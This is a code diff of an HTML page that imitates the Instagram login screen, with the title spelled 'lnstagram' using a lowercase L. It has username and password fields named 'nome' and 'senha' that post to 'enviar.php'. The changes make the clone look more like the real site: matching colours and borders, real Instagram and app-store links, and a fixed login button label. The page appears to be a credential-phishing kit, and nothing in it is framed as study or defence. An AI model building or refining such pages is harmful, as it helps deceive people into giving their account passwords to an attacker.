@@ -7,12 +7,12 @@
         maximum-scale=1.0, minimum-scale=1.0">
         <meta http-equiv="X-UA-Compatible" content="ie=edge">
         <title>lnstagram</title>
-        <link href="Img/logo.png" rel="icon" type="image/x-icon"/>
+        <link href="img/logo.png" rel="icon" type="image/x-icon"/>
         <!-- <link rel="stylesheet" href="http://use.fontawesome.com/release/v5.8.2/css/all.css"
         integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW=Pj2yciDJxpsK1OYPAYjqT085Qq/lcq5FLAZQ7Ay"
         crossoring="anonnymous">
         <link rel="stylesheet" href="style.css"> -->
-                <script type="text/javascript">
+                <script>
                         function validar(){
                                 var nome = formuser.nome.value;
                                 // var email = formuser.email.value;
@@ -51,15 +51,16 @@ html{
         box-sizing: border-box;
         font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
 }
-img{
+/* img{
         width: 100%;
         max-width: 100%;
         height: 100%;
-}
+} */
 a{
         text-decoration: none;
 }
 body{
+        margin: 32px auto 0;
         background-color: #fafafa;
 }
 #wrapper{
@@ -77,13 +78,15 @@ body{
 }
 #wrapper > .container{
         display: flex;
-        padding: 0 28rem;
-        /* padding: 0 27rem; */
+        justify-content: center;
+        /* padding: 0 8%; */
+        /* padding: 0 28rem; */
 }
 .phone-app-demo{
+        padding-right: 20px;
         height: 64.8rem;
-        background: url("img/Untitled.png") center no-repeat;
-        flex: 1;
+        /* background: url("img/celfix.png") no-repeat; */
+        /* flex: 1; */
 }
 .form-data{
         /* margin-left: 2rem; */
@@ -93,19 +96,18 @@ body{
 }
 .form-data form{
         background-color: #fff;
-        border: 2px solid #eee;
+        border: 1px solid #dbdbdb;
         display: flex;
         flex-direction: column;
-        padding: 2rem 4rem;
+        padding: 10px 40px;
         text-align: center;
 }
 .logo img{
-        margin-top: 5rem;
-        margin-top: 2rem;
+        margin: 22px auto 22px;
         width: 17.5rem;
-        margin-bottom: 2.5rem;
 }
 .form-data form input{
+        background: #fafafa;
         padding: 1rem;
         margin-bottom: .5rem;
         border: 1.2px solid #eee;
@@ -126,18 +128,27 @@ body{
         background-color: #fff;
         border: none;
 }
-.icon-fb{
-background-position:-320px -224px;
-height:16px;
-width:16px;
-display:inline-block;
-margin-right:0.5px;
-position:relative;
-top:3px;
+.icon-fb img{
+        width: 16px;
+
+        display: inline-block;
+        margin-right: 8px;
+        position: relative;
+        top: 3px;
+        /* width: 100%;
+        max-width: 100%;
+        height: 100%;
+        background-position:-320px -224px;
+        height:16px;
+        width:16px;
+        display:inline-block;
+        margin-right:0.5px;
+        position:relative;
+        top:3px; */
 } 
 .has-separator{
         font-size: 1.3rem;
-        color: #999999;
+        color: #8e8e8e;
         text-transform: uppercase;
         position: relative;
         margin-bottom: 2.5rem;
@@ -146,11 +157,11 @@ top:3px;
 .has-separator::after{
         content: "";
         position: absolute;
-        background-color: #eee;
+        background-color: #dbdbdb;
         width: 40%;
         height: 1px;
         top: 50%;
-        transform: translateY(-50%);
+        /* transform: translateY(-50%); */
 }
 .has-separator::before{
         left: 0;
@@ -169,8 +180,12 @@ top:3px;
         margin-right: .7rem;
 }
 .password-reset{
+        border: 0;
+        color: #00376b;
+        display: inline;
+        margin-top: 20px;
+        position: relative;
         font-size: 1.2rem;
-        color: #003569;
 }
 .sign-up{
         text-align: center;
@@ -178,15 +193,12 @@ top:3px;
         color: #262626;
         padding: 2rem 0;
         background-color: #fff;
-        border: 2px solid #eee;
+        border: 1px solid #dbdbdb;
         margin: 1rem 0;
-        font-weight:600;
-        /*text-decoration: none;
-        background-color: transparent; */
 }
 .sign-up a{
         color: #3897f0;
-        /* font-weight: bold; */
+        font-weight: 600;
 }
 .get-the-app{
         font-size: 1.4rem;
@@ -197,11 +209,7 @@ top:3px;
         margin: 2rem 0;
         color: #262626;
 }
-.badges{
-        width: 100%;
-        display: flex;
-        justify-content: center;
-}
+
 .badges img{
         max-width: 14rem;
         cursor:pointer;
@@ -209,36 +217,33 @@ top:3px;
 .badges img:first-child{
         margin-right: 1rem;
 }
-footer{
-        padding: 5rem 0;
-}
-footer .container{
-        display: flex;
-        justify-content: space-between;
-        /* font-weight: bold; */
-        text-transform: uppercase;
-        font-size: 1.3rem;
-        flex-wrap: wrap;
-        margin-top: 0;
+footer {
+        margin: 52px 52px;
 }
 .footer-nav ul{
         display: flex;
         flex-wrap: wrap;
         list-style: none;
+        justify-content: center;
+        font-size: 12px;
 }
 .footer-nav ul li{
-        margin-right: 1.6rem
+        margin-right: 1.6rem;
+        margin-bottom: 1rem;
 }
 .footer-nav ul li a{
-        color: #003569;
+        color: #999999;
 }
 .copyright-notice{
         color: #999999;
+        display: flex;
+        justify-content: center;
+        font-size: 12px;
 }
 #wrapper{
         padding-top: 0;
 }
-@media (max-width: 900px) {
+@media (max-width: 1000px) {
         .phone-app-demo{
                 display: none;
         }
@@ -281,23 +286,16 @@ footer .container{
         footer{
                 padding-bottom: 2rem;
         }
-        
-
-        /*Caixa de texto*/
-/* .boxsize{ 
-        flex: 1 0 auto;
-        margin: 0;
-        outline: 0; 
-        overflow: hidden;
-} */
 }
 </style>
 </head>
 <body>
 
-<div id="wrapper">
+<div id="wrapper">      
         <div class="container">
-                <div class="phone-app-demo"></div>
+                <div class="phone-app-demo">
+                        <img src="img/celfix.png" alt="">
+                </div>
                 <div class="form-data">
                         <form action=""name="formuser" action="enviar.php" method="POST">
                                 <div class="logo">
@@ -306,16 +304,17 @@ footer .container{
                                 
                                         <input type="text" name="nome" placeholder="phone number, username, or email">
                                         <input type="password"  name="senha" placeholder="password">
-                                        <button class="form-btn" type="submit" onclick="return validar()" href="https://instagram.com">Logi in</button>
+                                        <button class="form-btn" type="submit" onclick="return validar()" href="https://instagram.com">Login</button>
                                 
                                 <span class="has-separator">Or</span>
                                 <button type="submit" class="form-btn-fb">
-                                <a class ="facebook-login" href="#">
-                                        <div class="icon-fb">
-                                                <img src="img/facebook.png" alt="">
-                                        </div>
-                                        <i class="fab fa-facebook" href="#"></i>Log in with Facebook</button>
-                                </a>
+                                        <a class ="facebook-login" href="https://facebook.com">
+                                                <div class="icon-fb">
+                                                        <img src="img/facebook.png" alt="">Login with Facebook
+                                                </div>
+                                        
+                                        </a>
+                                </button>       
                                 <a class="password-reset" href="https://instagram.com">Forgot password?</a>
                         </form>
 
@@ -331,60 +330,58 @@ footer .container{
                         </body> -->
 
                         <div class="sign-up">
-                                Don't have an account? <a href="#">Sign up</a>
+                                Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
                         </div>
                         <div class="get-the-app">
                                 <span>Get the app.</span>
                                 <div class="badges">
-                                        <img src="img/appstore1.png" alt="" href="https://play.google.com/">
-                                        <img src="Img/playstore.png" alt="">
+                                        <a href="https://www.apple.com/app-store/"><img src="img/as.png"></a>
+                                        <a href="https://play.google.com/store?hl=pt_BR&gl=US"><img src="img/gp.png"> </a>
                                 </div>
                         </div>
                 </div>        
         </div>
 </div>
 <footer>
-        <div class="container">
-                <nav class="footer-nav">
-                        <ul>
-                                <li>
-                                        <a href="#">About Us</a>
-                                </li>
-                                <li>
-                                        <a href="#">Support</a>
-                                </li>
-                                <li>
-                                        <a href="#">Press</a>
-                                </li>
-                                <li>
-                                        <a href="#">Api</a>
-                                </li>
-                                <li>
-                                        <a href="#">Jobs</a>
-                                </li>
-                                <li>
-                                        <a href="#">Privacy</a>
-                                </li>
-                                <li>
-                                        <a href="#">Terms</a>
-                                </li>
-                                <li>
-                                        <a href="#">Directory</a>
-                                </li>
-                                <li>
-                                        <a href="#">Profiles</a>
-                                </li>
-                                <li>
-                                        <a href="#">Hashtags</a>
-                                </li>
-                                <li>
-                                        <a href="#">Languages</a>
-                                </li>
-                        </ul>
-                </nav>
-                <div class="copyright-notice">
-                        &copy; 2020 Instagram from facebook
-                </div>
+        <nav class="footer-nav">
+                <ul>
+                        <li>
+                                <a href="#">About Us</a>
+                        </li>
+                        <li>
+                                <a href="#">Support</a>
+                        </li>
+                        <li>
+                                <a href="#">Press</a>
+                        </li>
+                        <li>
+                                <a href="#">Api</a>
+                        </li>
+                        <li>
+                                <a href="#">Jobs</a>
+                        </li>
+                        <li>
+                                <a href="#">Privacy</a>
+                        </li>
+                        <li>
+                                <a href="#">Terms</a>
+                        </li>
+                        <li>
+                                <a href="#">Directory</a>
+                        </li>
+                        <li>
+                                <a href="#">Profiles</a>
+                        </li>
+                        <li>
+                                <a href="#">Hashtags</a>
+                        </li>
+                        <li>
+                                <a href="#">Languages</a>
+                        </li>
+                </ul>
+        </nav>
+        <div class="copyright-notice">
+                &copy; 2021 Instagram from facebook
         </div>
 </footer>
 </body>
